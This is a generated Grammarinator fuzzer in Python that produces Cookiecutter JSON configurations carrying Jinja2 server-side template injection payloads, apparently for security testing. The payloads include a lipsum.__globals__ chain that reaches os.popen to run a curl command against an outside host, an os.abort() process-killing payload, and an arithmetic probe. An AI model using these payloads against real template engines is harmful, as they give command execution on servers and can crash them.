# Generated by Grammarinator 26.1

from math import inf
from typing import Callable, ClassVar
from grammarinator.runtime import *

class CookiecutterSSTIGenerator(Generator):


    def start(self, parent: ParentRule | None = None) -> Rule:
        with UnparserRuleContext(self, 'start', parent) as rule:
            current = rule.current
            self.sstiCookiecutter(parent=current)
        return current

    def sstiCookiecutter(self, parent: ParentRule | None = None) -> Rule:
        with UnparserRuleContext(self, 'sstiCookiecutter', parent) as rule:
            current = rule.current
            self._reserve(61, self.LBRACE, parent=current)
            self._reserve(56, self.projectPair, parent=current)
            self._reserve(55, self.COMMA, parent=current)
            self._reserve(30, self.payload1Pair, parent=current)
            self._reserve(29, self.COMMA, parent=current)
            self._reserve(20, self.payload2Pair, parent=current)
            self._reserve(19, self.COMMA, parent=current)
            self._reserve(1, self.payload3Pair, parent=current)
            self.RBRACE(parent=current)
        return current

    def projectPair(self, parent: ParentRule | None = None) -> Rule:
        with UnparserRuleContext(self, 'projectPair', parent) as rule:
            current = rule.current
            self._reserve(4, self.PROJECT_NAME, parent=current)
            self._reserve(3, self.COLON, parent=current)
            self._reserve(2, self.QUOTE, parent=current)
            self._reserve(1, self.SAFE_NAME, parent=current)
            self.QUOTE(parent=current)
        return current

    def payload1Pair(self, parent: ParentRule | None = None) -> Rule:
        with UnparserRuleContext(self, 'payload1Pair', parent) as rule:
            current = rule.current
            self._reserve(24, self.SSTI_PAYLOAD1, parent=current)
            self._reserve(23, self.COLON, parent=current)
            self._reserve(22, self.QUOTE, parent=current)
            self._reserve(1, self.payloadCurl, parent=current)
            self.QUOTE(parent=current)
        return current

    def payload2Pair(self, parent: ParentRule | None = None) -> Rule:
        with UnparserRuleContext(self, 'payload2Pair', parent) as rule:
            current = rule.current
            self._reserve(8, self.SSTI_PAYLOAD2, parent=current)
            self._reserve(7, self.COLON, parent=current)
            self._reserve(6, self.QUOTE, parent=current)
            self._reserve(1, self.payloadMath, parent=current)
            self.QUOTE(parent=current)
        return current

    def payload3Pair(self, parent: ParentRule | None = None) -> Rule:
        with UnparserRuleContext(self, 'payload3Pair', parent) as rule:
            current = rule.current
            self._reserve(17, self.SSTI_PAYLOAD3, parent=current)
            self._reserve(16, self.COLON, parent=current)
            self._reserve(15, self.QUOTE, parent=current)
            self._reserve(1, self.payloadAbort, parent=current)
            self.QUOTE(parent=current)
        return current

    def payloadCurl(self, parent: ParentRule | None = None) -> Rule:
        with UnparserRuleContext(self, 'payloadCurl', parent) as rule:
            current = rule.current
            self._reserve(20, self.J2_OPEN, parent=current)
            self._reserve(19, self.LIPSUM, parent=current)
            self._reserve(18, self.DOT, parent=current)
            self._reserve(17, self.GLOBALS, parent=current)
            self._reserve(16, self.LBRACK, parent=current)
            self._reserve(15, self.SQUOTE, parent=current)
            self._reserve(14, self.OS, parent=current)
            self._reserve(13, self.SQUOTE, parent=current)
            self._reserve(12, self.RBRACK, parent=current)
            self._reserve(11, self.DOT, parent=current)
            self._reserve(10, self.POPEN, parent=current)
            self._reserve(9, self.LPAREN, parent=current)
            self._reserve(8, self.SQUOTE, parent=current)
            self._reserve(7, self.CURL_CMD, parent=current)
            self._reserve(6, self.SQUOTE, parent=current)
            self._reserve(5, self.RPAREN, parent=current)
            self._reserve(4, self.DOT, parent=current)
            self._reserve(3, self.READ, parent=current)
            self._reserve(2, self.LPAREN, parent=current)
            self._reserve(1, self.RPAREN, parent=current)
            self.J2_CLOSE(parent=current)
        return current

    def payloadMath(self, parent: ParentRule | None = None) -> Rule:
        with UnparserRuleContext(self, 'payloadMath', parent) as rule:
            current = rule.current
            self._reserve(4, self.J2_OPEN, parent=current)
            self._reserve(3, self.NUMBER, parent=current)
            self._reserve(2, self.PLUS, parent=current)
            self._reserve(1, self.NUMBER, parent=current)
            self.J2_CLOSE(parent=current)
        return current

    def payloadAbort(self, parent: ParentRule | None = None) -> Rule:
        with UnparserRuleContext(self, 'payloadAbort', parent) as rule:
            current = rule.current
            self._reserve(13, self.J2_OPEN, parent=current)
            self._reserve(12, self.LIPSUM, parent=current)
            self._reserve(11, self.DOT, parent=current)
            self._reserve(10, self.GLOBALS, parent=current)
            self._reserve(9, self.LBRACK, parent=current)
            self._reserve(8, self.SQUOTE, parent=current)
            self._reserve(7, self.OS, parent=current)
            self._reserve(6, self.SQUOTE, parent=current)
            self._reserve(5, self.RBRACK, parent=current)
            self._reserve(4, self.DOT, parent=current)
            self._reserve(3, self.ABORT, parent=current)
            self._reserve(2, self.LPAREN, parent=current)
            self._reserve(1, self.RPAREN, parent=current)
            self.J2_CLOSE(parent=current)
        return current

    def LBRACE(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'LBRACE', parent, True) as rule:
            current = rule.current
            current.src += '{'
        return current

    def RBRACE(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'RBRACE', parent, True) as rule:
            current = rule.current
            current.src += '}'
        return current

    def LBRACK(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'LBRACK', parent, True) as rule:
            current = rule.current
            current.src += '['
        return current

    def RBRACK(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'RBRACK', parent, True) as rule:
            current = rule.current
            current.src += ']'
        return current

    def COLON(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'COLON', parent, True) as rule:
            current = rule.current
            current.src += ':'
        return current

    def COMMA(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'COMMA', parent, True) as rule:
            current = rule.current
            current.src += ','
        return current

    def QUOTE(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'QUOTE', parent, True) as rule:
            current = rule.current
            current.src += '\"'
        return current

    def SQUOTE(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'SQUOTE', parent, True) as rule:
            current = rule.current
            current.src += '\''
        return current

    def DOT(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'DOT', parent, True) as rule:
            current = rule.current
            current.src += '.'
        return current

    def LPAREN(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'LPAREN', parent, True) as rule:
            current = rule.current
            current.src += '('
        return current

    def RPAREN(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'RPAREN', parent, True) as rule:
            current = rule.current
            current.src += ')'
        return current

    def PLUS(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'PLUS', parent, True) as rule:
            current = rule.current
            current.src += '+'
        return current

    def J2_OPEN(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'J2_OPEN', parent, True) as rule:
            current = rule.current
            current.src += '{{'
        return current

    def J2_CLOSE(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'J2_CLOSE', parent, True) as rule:
            current = rule.current
            current.src += '}}'
        return current

    def PROJECT_NAME(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'PROJECT_NAME', parent, True) as rule:
            current = rule.current
            current.src += '\"project_name\"'
        return current

    def SSTI_PAYLOAD1(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'SSTI_PAYLOAD1', parent, True) as rule:
            current = rule.current
            current.src += '\"ssti_payload1\"'
        return current

    def SSTI_PAYLOAD2(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'SSTI_PAYLOAD2', parent, True) as rule:
            current = rule.current
            current.src += '\"ssti_payload2\"'
        return current

    def SSTI_PAYLOAD3(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'SSTI_PAYLOAD3', parent, True) as rule:
            current = rule.current
            current.src += '\"ssti_payload3\"'
        return current

    def SAFE_NAME(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'SAFE_NAME', parent) as rule:
            current = rule.current
            with AlternationContext(rule, 0, CookiecutterSSTIGenerator._alt_sizes[0], 0, CookiecutterSSTIGenerator._alt_conds[0]) as alt0:
                current = rule.current
                current.src += ['safe_default', 'baseline_project', 'test_project'][alt0()]
            current = rule.current
        return current

    def LIPSUM(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'LIPSUM', parent, True) as rule:
            current = rule.current
            current.src += 'lipsum'
        return current

    def GLOBALS(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'GLOBALS', parent, True) as rule:
            current = rule.current
            current.src += '__globals__'
        return current

    def OS(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'OS', parent, True) as rule:
            current = rule.current
            current.src += 'os'
        return current

    def POPEN(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'POPEN', parent, True) as rule:
            current = rule.current
            current.src += 'popen'
        return current

    def READ(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'READ', parent, True) as rule:
            current = rule.current
            current.src += 'read'
        return current

    def ABORT(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'ABORT', parent, True) as rule:
            current = rule.current
            current.src += 'abort'
        return current

    def CURL_CMD(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'CURL_CMD', parent, True) as rule:
            current = rule.current
            current.src += 'curl -s https://api.restful-api.dev/objects'
        return current

    def NUMBER(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'NUMBER', parent) as rule:
            current = rule.current
            with QuantifierContext(rule, 0, 1, inf, CookiecutterSSTIGenerator._quant_sizes[0], 0) as quant0:
                while quant0():
                    with QuantifiedContext(rule):
                        current = rule.current
                        current.src += self._model.charset(current, 0, CookiecutterSSTIGenerator._charsets[1])
            current = rule.current
        return current

    def WS(self, parent: ParentRule | None = None) -> Rule:
        with UnlexerRuleContext(self, 'WS', parent) as rule:
            current = rule.current
            with QuantifierContext(rule, 0, 1, inf, CookiecutterSSTIGenerator._quant_sizes[0], 0) as quant0:
                while quant0():
                    with QuantifiedContext(rule):
                        current = rule.current
                        current.src += self._model.charset(current, 0, CookiecutterSSTIGenerator._charsets[2])
            current = rule.current
        return current


    _default_rule: ClassVar[Callable[['CookiecutterSSTIGenerator', ParentRule | None], Rule]] = start

    _rule_sizes: ClassVar[dict[str, RuleSize]] = {
        'start': RuleSize(5, 62),
        'sstiCookiecutter': RuleSize(4, 62),
        'projectPair': RuleSize(2, 5),
        'payload1Pair': RuleSize(3, 25),
        'payload2Pair': RuleSize(3, 9),
        'payload3Pair': RuleSize(3, 18),
        'payloadCurl': RuleSize(2, 21),
        'payloadMath': RuleSize(2, 5),
        'payloadAbort': RuleSize(2, 14),
        'LBRACE': RuleSize(1, 1),
        'RBRACE': RuleSize(1, 1),
        'LBRACK': RuleSize(1, 1),
        'RBRACK': RuleSize(1, 1),
        'COLON': RuleSize(1, 1),
        'COMMA': RuleSize(1, 1),
        'QUOTE': RuleSize(1, 1),
        'SQUOTE': RuleSize(1, 1),
        'DOT': RuleSize(1, 1),
        'LPAREN': RuleSize(1, 1),
        'RPAREN': RuleSize(1, 1),
        'PLUS': RuleSize(1, 1),
        'J2_OPEN': RuleSize(1, 1),
        'J2_CLOSE': RuleSize(1, 1),
        'PROJECT_NAME': RuleSize(1, 1),
        'SSTI_PAYLOAD1': RuleSize(1, 1),
        'SSTI_PAYLOAD2': RuleSize(1, 1),
        'SSTI_PAYLOAD3': RuleSize(1, 1),
        'SAFE_NAME': RuleSize(1, 1),
        'LIPSUM': RuleSize(1, 1),
        'GLOBALS': RuleSize(1, 1),
        'OS': RuleSize(1, 1),
        'POPEN': RuleSize(1, 1),
        'READ': RuleSize(1, 1),
        'ABORT': RuleSize(1, 1),
        'CURL_CMD': RuleSize(1, 1),
        'NUMBER': RuleSize(1, 1),
        'WS': RuleSize(1, 1),
    }

    _alt_sizes: ClassVar[tuple[tuple[RuleSize, ...], ...]] = (
        (RuleSize(0, 0), RuleSize(0, 0), RuleSize(0, 0)),  # 0
    )

    _alt_conds: ClassVar[tuple[tuple[float, ...], ...]] = (
        (1, 1, 1),  # 0
    )

    _quant_sizes: ClassVar[tuple[RuleSize, ...]] = (
        RuleSize(0, 0),  # 0
    )

    _charsets: ClassVar[tuple[tuple[int, ...], ...]] = (
        Generator._charset(((0x20, 0x7f), )),  # 0
        Generator._charset(((0x30, 0x3a), )),  # 1
        Generator._charset(((0x9, 0xa), (0xa, 0xb), (0xd, 0xe), (0x20, 0x21), )),  # 2
    )
